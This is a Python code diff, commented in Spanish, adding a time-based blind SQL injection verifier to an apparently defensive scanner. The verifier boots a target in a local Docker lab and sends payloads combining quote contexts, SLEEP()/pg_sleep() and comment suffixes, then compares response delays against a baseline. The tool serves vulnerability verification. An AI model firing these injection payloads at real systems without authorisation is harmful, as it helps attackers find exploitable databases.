@@ -18,8 +18,8 @@ import subprocess
 import time
 from typing import Callable, List, Optional
 
-from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _PATH_HINTS, _URL_HINTS, _docker_daemon_ok,
-                       _lab_host, _pick_param, _run, _token)
+from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _PATH_HINTS, _SQLI_HINTS, _URL_HINTS,
+                       _docker_daemon_ok, _lab_host, _pick_param, _run, _token)
 
 _COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")
 
@@ -565,6 +565,137 @@ def verify_generic_ssrf(
                           f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
                           f"que el endpoint/parametro no sean los reales, o que el servidor "
                           f"filtre de verdad las URLs internas antes de seguirlas)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
+        lab.teardown()
+
+
+# SLEEP() (MySQL/MariaDB/SQLite con create_function propio), pg_sleep() (PostgreSQL) -- el motor
+# real no se puede saber sin leer el codigo, asi que se prueban los dos dialectos en vez de
+# asumir uno. Si el motor real no tiene ninguno de los dos, el payload simplemente no ejecuta
+# nada y la peticion tarda lo normal (no es un falso positivo).
+_SQLI_SLEEP_SECONDS = 4.0
+_SQLI_SLEEP_EXPRS = (f"SLEEP({_SQLI_SLEEP_SECONDS:.0f})", f"pg_sleep({_SQLI_SLEEP_SECONDS:.0f})")
+_SQLI_CONTEXTS = ("", "'", '"', "')", '")')
+_SQLI_COMMENTS = ("-- -", "#")
+
+
+def verify_generic_sqli_blind(
+    source_dir: str, endpoint: str, http_method: str, parameters,
+    sqli_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+) -> WpVerifyResult:
+    """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
+    Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
+    ser MySQL/Postgres/SQLite/MSSQL/Mongo...), el error-based (extractvalue/updatexml, sintaxis
+    de MySQL) y el UNION-based (depende del numero de columnas Y de que el motor soporte UNION
+    igual) no generalizan sin arriesgar falsos positivos/negativos por motor equivocado -- el
+    retraso de una funcion SLEEP es la unica senal que vale casi igual en cualquier SQL.
+
+    Prueba dura contra falsos positivos por jitter de red/Docker: toma la MEDIANA de 2 peticiones
+    de control (sin inyeccion) como linea base, y solo marca `verified=True` si el payload
+    produce un retraso consistente (>= la mitad del SLEEP pedido) en las 2 repeticiones
+    independientes de la MISMA peticion, no en una sola medida que podria ser ruido."""
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
+    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
+    if not sqli_param:
+        res.detail = "no se identifico el parametro a inyectar"
+        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
+                               "'parameters' o pasalo a mano (sqli_param_hint)")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        import requests
+        m = (http_method or "GET").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
+        orig_value = str(base_params.get(sqli_param) or "1")
+
+        def timed_send(val) -> Optional[float]:
+            payload = dict(base_params)
+            payload[sqli_param] = val
+            t0 = time.time()
+            try:
+                requests.request(m, base_url + endpoint, timeout=_SQLI_SLEEP_SECONDS + 15,
+                                 data=payload if m != "GET" else None,
+                                 params=payload if m == "GET" else None)
+            except Exception:
+                return None
+            return time.time() - t0
+
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
+                             "metodo": m, "sqli_param": sqli_param})
+
+        step("midiendo tiempos de respuesta de control (sin inyeccion)...")
+        base_times = [t for t in (timed_send(orig_value), timed_send(orig_value)) if t is not None]
+        if not base_times:
+            res.detail = "las peticiones de control fallaron (sin tiempo base con el que comparar)"
+            return res
+        base_times.sort()
+        base_median = base_times[len(base_times) // 2]
+        res.evidence["tiempo_base_mediana_s"] = round(base_median, 2)
+
+        threshold = base_median + (_SQLI_SLEEP_SECONDS / 2)
+        tried = []
+        found = False
+        for ctx in _SQLI_CONTEXTS:
+            if found:
+                break
+            for sleep_expr in _SQLI_SLEEP_EXPRS:
+                if found:
+                    break
+                for cm in _SQLI_COMMENTS:
+                    payload_val = f"{orig_value}{ctx} AND {sleep_expr}{cm}"
+                    step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (time-based)...")
+                    t1 = timed_send(payload_val)
+                    t2 = timed_send(payload_val)
+                    entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
+                             "tiempo_2_s": round(t2, 2) if t2 else None}
+                    tried.append(entry)
+                    if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
+                        found = True
+                        res.evidence["payload_ganador"] = payload_val
+                        res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
+                        res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
+                        step(f"VERIFICADO: {sqli_param}={payload_val!r} retraso la respuesta "
+                             f"~{round((t1+t2)/2, 1)}s de forma CONSISTENTE en 2 repeticiones "
+                             f"independientes (linea base {round(base_median, 1)}s) -- SQLi ciega "
+                             f"por tiempo, no ruido de red/Docker.")
+                        break
+
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
+                          f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
+                          f"consistente en 2 peticiones independientes, por encima de la linea "
+                          f"base + la mitad del retraso pedido -- no es ruido de red/Docker")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} combinaciones de contexto/dialecto de "
+                          f"SLEEP y ninguna retraso la respuesta de forma consistente -- la SQLi "
+                          f"ciega por tiempo no se confirmo (puede que el endpoint/parametro no "
+                          f"sean los reales, que el motor no soporte ninguno de los dialectos "
+                          f"probados, o que de verdad no haya inyeccion)")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
